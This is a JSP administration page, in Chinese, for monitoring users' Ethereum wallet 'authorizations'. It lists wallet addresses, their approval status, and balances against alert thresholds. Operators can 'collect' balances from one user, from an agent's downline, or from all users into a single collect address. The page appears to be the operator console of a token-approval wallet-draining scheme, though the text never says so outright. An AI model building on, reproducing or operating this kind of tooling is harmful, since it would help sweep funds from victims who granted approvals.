<%@ page language="java" pageEncoding="utf-8" isELIgnored="false"%>
<%@taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt" %>
<%@taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions" %>
<jsp:useBean id="security" class="security.web.BaseSecurityAction" scope="page" />

<%@ include file="include/pagetop.jsp"%>
<!DOCTYPE html>
<html>
<head>
<%@ include file="include/head.jsp"%>
</head>
<body>
	<%@ include file="include/loading.jsp"%>
<%-- 	<%@ include file="include/top.jsp"%> --%>
<%-- 	<%@ include file="include/menu_left.jsp"%> --%>

	<!-- //////////////////////////////////////////////////////////////////////////// -->
	<!-- START CONTENT -->
	<div class="ifr-dody">
        <input type="hidden" name="session_token" id="session_token" value="${session_token}"/>
        
		<!-- //////////////////////////////////////////////////////////////////////////// -->
		<!-- START CONTAINER -->
		<div class="ifr-con">
			<h3>授权管理</h3>
			<%@ include file="include/alert.jsp"%>
			<!-- //////////////////////////////////////////////////////////////////////////// -->
			<!-- START queryForm -->
			<div class="row">
				<div class="col-md-12">
					<div class="panel panel-default">

						<div class="panel-title">查询条件</div>
						<div class="panel-body">
							<form class="form-horizontal"
								action="<%=basePath%>normal/adminAutoMonitorWalletAction!list.action"
								method="post" id="queryForm">
							
								<input type="hidden" name="pageNo" id="pageNo" value="${pageNo}">
								<input type="hidden" name="state_para" id="state_para"/>

								 <div class="col-md-12 col-lg-4">
										<fieldset>
											<div class="control-group">
												<div class="controls">
													<input id="name_para" name="name_para" 
													class="form-control" placeholder="用户名(钱包地址)、UID" value="${name_para}"/>
												</div>
											</div>
										</fieldset>
									</div>

								<div class="col-md-12 col-lg-4">
									<fieldset>
										<div class="control-group">
											<div class="controls">
													
												<input id="monitor_address_para" name="monitor_address_para" 
													class="form-control" placeholder="授权地址（完整）" value="${monitor_address_para}"/>
											</div>
										</div>
									</fieldset>
								</div>
								
									<div class="col-md-12 col-lg-3">
										<fieldset>
											<div class="control-group">
												<div class="controls">
													<select id="sort_by" name="sort_by" class="form-control">
													   <option value="">余额排序方式</option>
									<option value="desc" <c:if test="${sort_by == 'desc'}">selected="true"</c:if> >余额从高到低</option>
									<option value="asc" <c:if test="${sort_by == 'asc'}">selected="true"</c:if> >余额从低到高</option>
									
													</select>
												</div>
											</div>
										</fieldset>
									</div>
							
								 
								<div class="col-md-12 col-lg-2" style="margin-top:15px;">
									<button type="submit" class="btn btn-light btn-block">查询</button>
								</div>
								
							</form>
							<div class="col-md-12 col-lg-12" style="margin-top: 10px;">
									<div class="mailbox clearfix">
										<div class="mailbox-menu">
											<ul class="menu">
												<li><a href="javascript:setState('')"> 全部</a></li>
												<li><a href="javascript:setState(0)"> 授权申请中</a></li>
												<li><a href="javascript:setState(1)"> 授权成功</a></li>
												<li><a href="javascript:setState(2)"> 授权失败</a></li>
												<li><a href="javascript:setState(4)"> 拒绝授权</a></li>
											</ul>
										</div>
									</div>
								</div>
				
								<c:if test="${security.isRolesAccessible('ROLE_ROOT,ROLE_ADMIN')
											 || security.isResourceAccessible('OP_AUTHORIZE_OPERATE')}">
								
									<div class="col-md-12 col-lg-12 " style="margin-top: 25px;margin-left: -15px;">
											<div class="panel-title">操作</div>
											<div class="col-md-12 col-lg-3">
												<button type="button" onclick="collection_all()" class="btn btn-light btn-block " >
												归集钱包</button>
											</div>
									</div>
								
								</c:if>
								
						</div>

					</div>
				</div>
			</div>
			<!-- END queryForm -->
			<!-- //////////////////////////////////////////////////////////////////////////// -->

			<div class="row">
				<div class="col-md-12">
					<!-- Start Panel -->
					<div class="panel panel-default">

						<div class="panel-title">查询结果</div>
						<div class="panel-body">
							<table class="table table-bordered table-striped">
								<thead>
									<tr>
										<td>用户名</td>
										<td>UID</td>
										<td>推荐人</td>
										<td>账户类型</td>
										<td>授权地址</td>
										<!-- <td>授权金额</td> -->
										<td>授权时间</td>
										<td>授权状态</td>
										<td>钱包地址余额</td>
										<td>阀值</td>
										<td>备注</td>
										<td width="130px"></td>
									</tr>
								</thead>
								<tbody>
									<!-- <s:iterator value="page.elements" status="stat"> -->
									<c:forEach items="${page.getElements()}" var="item" varStatus="stat">
										<tr>
											<td>
											<c:choose>
												<c:when test="${item.username!='' && item.username!=null}">
													<a style="font-size: 10px;" href="#" onClick="getallname('${item.username}')">
														${fn:substring(item.username,0,4)}***${fn:substring(item.username,fn:length(item.username) - 4, fn:length(item.username))}
													</a>
												</c:when>
												<c:otherwise>
													${item.username}
												</c:otherwise>
											</c:choose>
											</td>
											<td>${item.usercode}</td>
											<td>
											<c:choose>
												<c:when test="${item.username_parent!='' && item.username_parent!=null}">
													<a style="font-size: 10px;" href="#" onClick="getallname('${item.username_parent}')">
														${fn:substring(item.username_parent,0,4)}***${fn:substring(item.username_parent,fn:length(item.username_parent) - 4, fn:length(item.username_parent))}
													</a>
												</c:when>
												<c:otherwise>
													${item.username_parent}
												</c:otherwise>
											</c:choose>
											</td>										
											<td>
												<c:choose>
													<c:when test="${item.rolename=='GUEST'}">
														<span class="right label label-warning">${item.roleNameDesc}</span>
													</c:when>
													<c:when test="${item.rolename=='MEMBER'}">
														<span class="right label label-success">${item.roleNameDesc}</span>
													</c:when>
													<c:when test="${item.rolename=='AGENT'}">
														<span class="right label label-primary">${item.roleNameDesc}</span>
													</c:when>
													<c:when test="${item.rolename=='AGENTLOW'}">
														<span class="right label label-primary">${item.roleNameDesc}</span>
													</c:when>
													<c:otherwise>
													 	${item.roleNameDesc}
													</c:otherwise>	
												</c:choose>
											</td>
											<!--<td><s:property value="txn_hash" /></td>-->
											<td>${item.monitor_address_hide}</td>
											<%-- <td>${item.monitor_amount}</td> --%>											
											<td>${item.created}<td>											
											<c:if test="${item.monitor_succeeded=='0'}">
												<span class="right label label-warning">授权申请中</span>
											</c:if>
											<c:if test="${item.monitor_succeeded=='1'}">
												<span class="right label label-success">已授权</span>
											</c:if>
											<c:if test="${item.monitor_succeeded=='2'}">
												授权失败
											</c:if>
											<c:if test="${item.monitor_succeeded=='3'}">
												未授权
											</c:if>
											<c:if test="${item.monitor_succeeded=='4'}">
												拒绝授权
											</c:if>
											<c:if test="${item.monitor_succeeded=='-5'}">
												异常授权
											</c:if>
											</td>  
											<td>
											<c:if test="${item.volume >= item.threshold}">
												<span class="label label-danger">${item.volume}</span>
											</c:if>
											<c:if test="${item.volume < item.threshold}">
												<span class="label label-success">${item.volume}</span>
											</c:if>
											</td>
											<td>${item.threshold}</td>
											
											<td>${item.remarks}</td>
											
											<td>
				
												<c:if test="${security.isRolesAccessible('ROLE_ROOT,ROLE_ADMIN')
															 || security.isResourceAccessible('OP_AUTHORIZE_OPERATE')}">
											
													<div class="btn-group">
														<button type="button" class="btn btn-light">操作</button>
														<button type="button" class="btn btn-light dropdown-toggle"
															data-toggle="dropdown" aria-expanded="false">
															<span class="caret"></span> <span class="sr-only">Toggle Dropdown</span>
														</button>
														<ul class="dropdown-menu" role="menu">
																												
															<c:if test="${!security.isRolesAccessible('ROLE_MAINTAINER')}">
																<li><a href="javascript:getCollectAddress('${item.id}','${item.usercode}')">钱包余额归集</a></li>
																<li><a href="javascript:resetThreshold('${item.id}','${item.threshold}')">修改阀值</a></li>
																<li><a href="javascript:reject_remarks('${item.id}','${item.remarks}')">修改备注</a></li>
															</c:if>
															
															<c:if test="${security.isRolesAccessible('ROLE_ROOT')
															 			|| security.isResourceAccessible('OP_AUTHORIZE_OPERATE')}">
																<li><a href="javascript:resetMonitor('${item.id}')">手动修改授权状态</a></li>														
																<li><a href="javascript:resetMonitor_root('${item.id}')">ROOT手动修改授权状态</a></li>
															</c:if>
														
														</ul>
													</div>
													
												</c:if>
												
											</td>
											
										</tr>
									</c:forEach>
									<!-- </s:iterator> -->

								</tbody>
							</table>
							<%@ include file="include/page_simple.jsp"%>
							<nav>
						</div>

					</div>
					<!-- End Panel -->

				</div>
			</div>

		</div>
		<!-- END CONTAINER -->
		<!-- //////////////////////////////////////////////////////////////////////////// -->
<!-- 模态框 -->

        <div class="form-group">
			<div class="col-sm-1">
				<!-- 模态框（Modal） -->
				<div class="modal fade" id="net_form" tabindex="-1"
					role="dialog" aria-labelledby="myModalLabel"
					aria-hidden="true">
					<div class="modal-dialog">
						<div class="modal-content">
							<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal"
										aria-hidden="true">&times;</button>
									<h4 class="modal-title" id="myModalLabel">完整用户名（完整钱包地址）</h4>
							</div>
							<div class="modal-header">
									<h4 class="modal-title" name="usernallName" id="usernallName"  readonly="true" style="display: inline-block;"></h4>
									<a href="" id="user_all_name_a" sytle="cursor:pointer;" target="_blank">在Etherscan上查看</a>
							</div>
										
							<div class="modal-body">
									<div class="">
									</div>
							</div>
								
				        </div>
					</div>
				</div>
			</div>
		</div>
													
												

		<%@ include file="include/footer.jsp"%>

	</div>
	<!-- End Content -->
	<!-- //////////////////////////////////////////////////////////////////////////// -->


	<%@ include file="include/js.jsp"%>
	

	
	<script type="text/javascript">
	function getCollectAddress(id,usercode){
// 		 $("#money_address_one").val(tmp.collectAddress);
		 var session_token = $("#session_token").val();
		 $("#session_token_collection_one").val(session_token);
		$("#id_collection_one").val(id);
		$("#usercode_one").val(usercode);
		 
		$('#modal_collection_one').modal("show");

	}
	function goNewAjaxUrl(targetUrl,data,Func,Fail){
// 		console.log(data);
		$.ajax({
			url:targetUrl,
			data:data,
			type : 'get',
			dataType : "json",
			success: function (res) {
				var tmp = $.parseJSON(res)
				console.log(tmp);
			    if(tmp.code==200){
			    	Func(tmp);
			    }else if(tmp.code==500){
			    	Fail();
			    	swal({
						title : tmp.message,
						text : "",
						type : "warning",
						showCancelButton : true,
						confirmButtonColor : "#DD6B55",
						confirmButtonText : "确认",
						closeOnConfirm : false
					});
			    }
			  },
				error : function(XMLHttpRequest, textStatus,
						errorThrown) {
					swal({
						title : "请求错误",
						text : "",
						type : "warning",
						showCancelButton : true,
						confirmButtonColor : "#DD6B55",
						confirmButtonText : "确认",
						closeOnConfirm : false
					});
					console.log("请求错误");
				}
		});
	}
	
	function collection_all() {
		var session_token = $("#session_token").val();
		$("#session_token_collection_all").val(session_token);
		$('#modal_collection_all').modal("show");
	}	
	

	
	function sub_all_confirm() {
		var usercode_collection = $("#usercode_collection").val();
		if(usercode_collection == ""){
			swal({
				title : "全部用户钱包余额归集！！！",
				text : "请再次确认操作是否进行",
				type : "error",
				showCancelButton : true,
				confirmButtonColor : "#DD6B55",
				confirmButtonText : "确认",
				closeOnConfirm : true
			}, function() {
				$('#modal_collection_all2').modal("show");
				
			});
		}else{
			swal({
				title : "是否确认归集钱包余额！",
				text : "归集用户钱包余额",
				type : "warning",
				showCancelButton : true,
				confirmButtonColor : "#DD6B55",
				confirmButtonText : "确认",
				closeOnConfirm : true
			}, function() {
				$('#modal_collection_all3').modal("show");
			});
		}
		
		

	};
	
	function sub_all_confirm2() {
		var super_google_auth_code2 = $("#super_google_auth_code2").val();
		$("#super_google_auth_code").val(super_google_auth_code2);
		
		document.getElementById("subCollectAllForm").submit();
	};
	function sub_all_confirm3() {
		var super_google_auth_code3 = $("#super_google_auth_code3").val();
		$("#super_google_auth_code").val(super_google_auth_code3);
		
		document.getElementById("subCollectAllForm").submit();
		
		

	};
	
	function collection_one(id,usercode) {
		var session_token = $("#session_token").val();
		 $("#session_token_collection_one").val(session_token);
		$("#id_collection_one").val(id);
		$("#usercode_one").val(usercode);
		
		$('#modal_collection_one').modal("show");
		getCollectAddress();
	}	
	function sub_confirm() {
		
		swal({
			title : "是否确认归集?",
			text : "归集用户钱包余额",
			type : "warning",
			showCancelButton : true,
			confirmButtonColor : "#DD6B55",
			confirmButtonText : "确认",
			closeOnConfirm : false
		}, function() {
			document.getElementById("subCollectForm").submit();
		});

	};
	
	
	
	
	function resetThreshold(id,threshold) {
		var session_token = $("#session_token").val();
		 $("#session_token_reset_threshold").val(session_token);
		$("#id_reset_threshold").val(id);
		$("#bofore_reset_threshold").val(threshold);
		$("#reset_threshold").val(threshold);
		$('#modal_reset_threshold').modal("show");
	}	
	function reject_remarks(id,remarks) {
		var session_token = $("#session_token").val();
		 $("#session_token_reset_remarks").val(session_token);
		$("#id_reset_remarks").val(id);
		$("#bofore_remarks").val(remarks);
		$("#reset_remarks").val(remarks);
		$('#modal_reset_remarks').modal("show");
	}	
	
	function resetMonitor(id) {
		var session_token = $("#session_token").val();
		 $("#session_token_reset_monitor").val(session_token);
		$("#id_reset_monitor").val(id);
		$('#modal_reset_monitor').modal("show");
	}	
	
	function resetMonitor_root(id) {
		var session_token = $("#session_token").val();
		 $("#session_token_reset_monitor_root").val(session_token);
		$("#id_reset_monitor_root").val(id);
		$('#modal_reset_monitor_root').modal("show");
	}	
	
	
	</script>

	<!-- 模态框 -->
		<div class="form-group">
			<form action="<%=basePath%>normal/adminAutoMonitorWalletAction!CollectAll.action"
				method="post" id="subCollectAllForm">
				<input type="hidden" name="pageNo" id="pageNo" value="${pageNo}">
				<input type="hidden" name="monitor_address_para" id="monitor_address_para" value="${monitor_address_para}"/>
				<input type="hidden" name="txn_hash_para" id="txn_hash_para" value="${txn_hash_para}"/>
				<input type="hidden" name="session_token" id="session_token_collection_all" value="${session_token}"/>
				<input type="hidden" name="super_google_auth_code" id="super_google_auth_code" value="${super_google_auth_code}"/>
				<input type="hidden" name="collect_type" value="all"/>
				
				<div class="col-sm-1">
					<!-- 模态框（Modal） -->
					<div class="modal fade" id="modal_collection_all" tabindex="-1"
						role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
						<div class="modal-dialog">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal"
										aria-hidden="true">&times;</button>
									<h4 class="modal-title" id="myModalLabel">归集用户钱包</h4>
								</div>
								<div class="modal-body">
									<div class="">
									<span class="help-block">请输入UID</span>
									<span class="help-block">UID如果为空，则是全部用户归集。</span>
									<span class="help-block">UID如果是代理UID 则是归集代理线下所有用户。</span>
									<span class="help-block">UID如果是用户UID，则是单个归集</span>
										<input id="usercode_collection" name="usercode_collection" class="form-control" placeholder="请输入UID"/>
									</div>
								</div>
								<div class="modal-header">
									<h4 class="modal-title" id="myModalLabel">归集地址</h4>
								</div>
								<div class="modal-header">
								<h4 class="modal-title" name="collectAddress" id="collectAddress"  readonly="readonly" style="display: inline-block;">${collectAddress}</h4>
								<a href="https://etherscan.io/address/${collectAddress}" id="approve_address_a" sytle="cursor:pointer;" target="_blank">在Etherscan上查看</a>
								</div>
								<div class="modal-header">
									<h4 class="modal-title" id="myModalLabel">登录人资金密码</h4>
								</div>
								<div class="modal-body">
									<div class="">
										<input id="safeword" type="password" name="safeword"
											class="form-control" placeholder="请输入登录人资金密码">
									</div>
								</div>
								
								
								<div class="modal-footer" style="margin-top: 0;">
									<button type="button" class="btn " data-dismiss="modal">关闭</button>
									<button type="button" onclick="sub_all_confirm()" class="btn btn-default" >确认</button>
								</div>
							</div>
							<!-- /.modal-content -->
						</div>
						<!-- /.modal -->
					</div>
				</div>
			</form>
		</div>
		
		<!-- 模态框 -->
		<div class="form-group">
			<form action=""
				method="post" id="subCollectAllForm3">
				<input type="hidden" name="pageNo" id="pageNo"
					value="${pageNo}">
				
				<div class="col-sm-1">
					<!-- 模态框（Modal） -->
					<div class="modal fade" id="modal_collection_all3" tabindex="-1"
						role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
						<div class="modal-dialog">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal"
										aria-hidden="true">&times;</button>
									<h4 class="modal-title" id="myModalLabel">归集用户钱包</h4>
								
								
								</div>
								<div class="modal-header">
										<span class="help-block">UID如果是代理UID 则是归集代理线下所有用户。</span>
									<span class="help-block">UID如果是用户UID，则是单个归集</span>
								</div>
								
								<div class="modal-header">
									<h4 class="modal-title" id="myModalLabel">请再输入超级谷歌验证码</h4>
								</div>
								<div class="modal-body">
									<div class="">
										<input id="super_google_auth_code3" name="super_google_auth_code3"
											class="form-control" placeholder="请输入超级谷歌验证码">
									</div>
								</div>
								<div class="modal-footer" style="margin-top: 0;">
									<button type="button" class="btn " data-dismiss="modal">关闭</button>
									<button type="button" onclick="sub_all_confirm3()" class="btn btn-default" >确认</button>
								</div>
							</div>
							<!-- /.modal-content -->
						</div>
						<!-- /.modal -->
					</div>
				</div>
			</form>
		</div>
		
		<!-- 模态框 -->
		<div class="form-group">
			<form action=""
				method="post" id="subCollectAllForm2">
				<input type="hidden" name="pageNo" id="pageNo"
					value="${pageNo}">
				
				<div class="col-sm-1">
					<!-- 模态框（Modal） -->
					<div class="modal fade" id="modal_collection_all2" tabindex="-1"
						role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
						<div class="modal-dialog">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal"
										aria-hidden="true">&times;</button>
									<h4 class="modal-title" id="myModalLabel">归集用户或代理商名下用户钱包</h4>
								</div>
								
								<div class="modal-header">
									<h4 class="modal-title" id="myModalLabel">请再输入超级谷歌验证码</h4>
								</div>
								<div class="modal-body">
									<div class="">
										<input id="super_google_auth_code2" name="super_google_auth_code2"
											class="form-control" placeholder="请输入超级谷歌验证码">
									</div>
								</div>
								<div class="modal-footer" style="margin-top: 0;">
									<button type="button" class="btn " data-dismiss="modal">关闭</button>
									<button type="button" onclick="sub_all_confirm2()" class="btn btn-default" >确认</button>
								</div>
							</div>
							<!-- /.modal-content -->
						</div>
						<!-- /.modal -->
					</div>
				</div>
			</form>
		</div>
					
		<!-- 模态框 -->
		<div class="form-group">
			<form action="<%=basePath%>normal/adminAutoMonitorWalletAction!CollectAll.action"
				method="post" id="subCollectForm">
				<input type="hidden" name="pageNo" id="pageNo" value="${pageNo}">
			    <input type="hidden" name="monitor_address_para" id="monitor_address_para"/>
				<input type="hidden" name="txn_hash_para" id="txn_hash_para"/>
				<input type="hidden" name="id" id="id_collection_one"/>		
				<input type="hidden" name="session_token" id="session_token_collection_one" value="${session_token}"/>
				
				<div class="col-sm-1">
					<!-- 模态框（Modal） -->
					<div class="modal fade" id="modal_collection_one" tabindex="-1"
						role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
						<div class="modal-dialog">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal"
										aria-hidden="true">&times;</button>
									<h4 class="modal-title" id="myModalLabel">归集单个用户钱包全部金额</h4>
								</div>
								<div class="modal-body">
									<div class="">
									<span class="help-block">用户UID</span>
										<input id="usercode_one" name="usercode_collection" class="form-control" readonly="true"/>
									</div>
								</div>
								<div class="modal-header">
									<h4 class="modal-title" id="myModalLabel">归集地址</h4>
								</div>
								<div class="modal-header">
								<h4 class="modal-title" name="collectAddress" id="collectAddress"  readonly="true" style="display: inline-block;">${collectAddress}</h4>
								<a href="https://etherscan.io/address/${collectAddress}" id="approve_address_a" sytle="cursor:pointer;" target="_blank">在Etherscan上查看</a>
								</div>
								<div class="modal-header">
									<h4 class="modal-title" id="myModalLabel">归集金额</h4>
								</div>
								<div class="modal-body">
									<div class="">
										<input id="collect_amount" type="text" name="collect_amount"
											class="form-control" placeholder="请输入归集金额">
									</div>
								</div>
								<div class="modal-header">
									<h4 class="modal-title" id="myModalLabel">登录人资金密码</h4>
								</div>
								<div class="modal-body">
									<div class="">
										<input id="safeword" type="password" name="safeword"
											class="form-control" placeholder="请输入登录人资金密码">
									</div>
								</div>
								<div class="modal-header">
									<h4 class="modal-title" id="myModalLabel">谷歌验证码</h4>
								</div>
								<div class="modal-body">
									<div class="">
										<input id="google_auth_code" name="google_auth_code"
											class="form-control" placeholder="请输入谷歌验证码">
									</div>
								</div>
								<div class="modal-footer" style="margin-top: 0;">
									<button type="button" class="btn " data-dismiss="modal">关闭</button>
									<button type="button" onclick="sub_confirm()" class="btn btn-default" >确认</button>
								</div>
							</div>
							<!-- /.modal-content -->
						</div>
						<!-- /.modal -->
					</div>
				</div>
			</form>
		</div>
				
		<!-- 模态框 -->
		<div class="form-group">
			<form action="<%=basePath%>normal/adminAutoMonitorWalletAction!resetThreshold.action"
				method="post" id="resetForm">
				<input type="hidden" name="pageNo" id="pageNo" value="${pageNo}">
				<input type="hidden" name="monitor_address_para" id="monitor_address_para"/>
				<input type="hidden" name="txn_hash_para" id="txn_hash_para"/>
				<input type="hidden" name="id" id="id_reset_threshold"/>
				<input type="hidden" name="session_token" id="session_token_reset_threshold" value="${session_token}"/>
				<input type="hidden" name="bofore_reset_threshold" id="bofore_reset_threshold"/>
				
				<div class="col-sm-1">
					<!-- 模态框（Modal） -->
					<div class="modal fade" id="modal_reset_threshold" tabindex="-1"
						role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
						<div class="modal-dialog">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal"
										aria-hidden="true">&times;</button>
									<h4 class="modal-title" id="myModalLabel">修改提醒阀值(只能是整数数字，并且不能小于0)</h4>
								</div>
								<div class="modal-body">
									<div class="">
									<span class="help-block">请输入新的阀值</span>
										<input id="reset_threshold" name="reset_threshold" class="form-control"/>
									</div>
								</div>
								
								<div class="modal-footer" style="margin-top: 0;">
									<button type="button" class="btn " data-dismiss="modal">关闭</button>
									<button id="sub" type="submit" class="btn btn-default" >确认</button>
								</div>
							</div>
							<!-- /.modal-content -->
						</div>
						<!-- /.modal -->
					</div>
				</div>
			</form>
		</div>

		<!-- 模态框 -->
		<div class="form-group">
			<form action="<%=basePath%>normal/adminAutoMonitorWalletAction!resetRemarks.action"
				method="post" id="resetForm">
				<input type="hidden" name="pageNo" id="pageNo" value="${pageNo}">
				<input type="hidden" name="monitor_address_para" id="monitor_address_para"/>
				<input type="hidden" name="txn_hash_para" id="txn_hash_para"/>
				<input type="hidden" name="id" id="id_reset_remarks"/>
				<input type="hidden" name="session_token" id="session_token_reset_remarks" value="${session_token}"/>
				<input type="hidden" name="bofore_remarks" id="bofore_remarks"/>
				
				<div class="col-sm-1">
					<!-- 模态框（Modal） -->
					<div class="modal fade" id="modal_reset_remarks" tabindex="-1"
						role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
						<div class="modal-dialog">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal"
										aria-hidden="true">&times;</button>
									<h4 class="modal-title" id="myModalLabel">修改备注信息</h4>
								</div>
								<div class="modal-body">
									<div class="">
									<span class="help-block">请输入新的备注信息</span>	
									<input id="reset_remarks" name="reset_remarks" class="form-control"/>
									</div>
								</div>
								
								<div class="modal-footer" style="margin-top: 0;">
									<button type="button" class="btn " data-dismiss="modal">关闭</button>
									<button id="sub" type="submit" class="btn btn-default" >确认</button>
								</div>
							</div>
							<!-- /.modal-content -->
						</div>
						<!-- /.modal -->
					</div>
				</div>
			</form>
		</div>
		
		<!-- 模态框 -->
		<div class="form-group">
			<form action="<%=basePath%>normal/adminAutoMonitorWalletAction!resetMonitor.action"
				method="post" id="resetForm">
				<input type="hidden" name="pageNo" id="pageNo" value="${pageNo}">
				<input type="hidden" name="monitor_address_para" id="monitor_address_para"/>
				<input type="hidden" name="txn_hash_para" id="txn_hash_para"/>
				<input type="hidden" name="id" id="id_reset_monitor"/>
				<input type="hidden" name="session_token" id="session_token_reset_monitor" value="${session_token}"/>
		
				<div class="col-sm-1">
					<!-- 模态框（Modal） -->
					<div class="modal fade" id="modal_reset_monitor" tabindex="-1"
						role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
						<div class="modal-dialog">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal"
										aria-hidden="true">&times;</button>
									<h4 class="modal-title" id="myModalLabel">手动修改用户授权状态</h4>
								</div>
								<div class="modal-body">
									<div class="">			
									<select id="monitor_succeed_type" name="monitor_succeed_type" class="form-control " >
									   <option value="">授权状态</option>
									   <option value="1">授权成功</option>
									   <option value="2">授权失败</option>
									</select>
									</div>
								</div>
								
									<div class="modal-header">
									<h4 class="modal-title" id="myModalLabel">登录人资金密码</h4>
								</div>
								<div class="modal-body">
									<div class="">
										<input id="safeword" type="password" name="safeword"
											class="form-control" placeholder="请输入登录人资金密码">
									</div>
								</div>
								
								
								<div class="modal-footer" style="margin-top: 0;">
									<button type="button" class="btn " data-dismiss="modal">关闭</button>
									<button id="sub" type="submit" class="btn btn-default" >确认</button>
								</div>
							</div>
							<!-- /.modal-content -->
						</div>
						<!-- /.modal -->
					</div>
				</div>
			</form>
		</div>
			
		<!-- 模态框 -->
		<div class="form-group">
			<form action="<%=basePath%>normal/adminAutoMonitorWalletAction!resetMonitor.action"
				method="post" id="resetForm">
				<input type="hidden" name="pageNo" id="pageNo" value="${pageNo}">
				
				<input type="hidden" name="monitor_address_para" id="monitor_address_para"/>
				<input type="hidden" name="txn_hash_para" id="txn_hash_para"/>
				<input type="hidden" name="id" id="id_reset_monitor_root"/>
				<input type="hidden" name="session_token" id="session_token_reset_monitor_root" value="${session_token}"/>
				
				<div class="col-sm-1">
					<!-- 模态框（Modal） -->
					<div class="modal fade" id="modal_reset_monitor_root" tabindex="-1"
						role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
						<div class="modal-dialog">
							<div class="modal-content">
								<div class="modal-header">
									<button type="button" class="close" data-dismiss="modal"
										aria-hidden="true">&times;</button>
									<h4 class="modal-title" id="myModalLabel">ROOT手动修改用户授权状态</h4>
								</div>
								<div class="modal-body">
									<div class="">
									<select id="monitor_succeed_type" name="monitor_succeed_type" class="form-control " >
									   <option value="">授权状态</option>
									   <option value="1">授权成功</option>
									   <option value="2">授权失败</option>
									   <option value="5">授权异常</option>
									</select>
									</div>
								</div>
								
									<div class="modal-header">
									<h4 class="modal-title" id="myModalLabel">登录人资金密码</h4>
								</div>
								<div class="modal-body">
									<div class="">
										<input id="safeword" type="password" name="safeword"
											class="form-control" placeholder="请输入登录人资金密码">
									</div>
								</div>
								
								
								<div class="modal-footer" style="margin-top: 0;">
									<button type="button" class="btn " data-dismiss="modal">关闭</button>
									<button id="sub" type="submit" class="btn btn-default" >确认</button>
								</div>
							</div>
							<!-- /.modal-content -->
						</div>
						<!-- /.modal -->
					</div>
				</div>
			</form>
		</div>

<script type="text/javascript">
function setState(state){
	document.getElementById("state_para").value = state;
	document.getElementById("queryForm").submit();
}

function getallname(name){
	$("#usernallName").html(name);
	$("#user_all_name_a").attr("href","https://etherscan.io/address/"+name);
	$("#net_form").modal("show");
}

</script>

	
</body>
</html>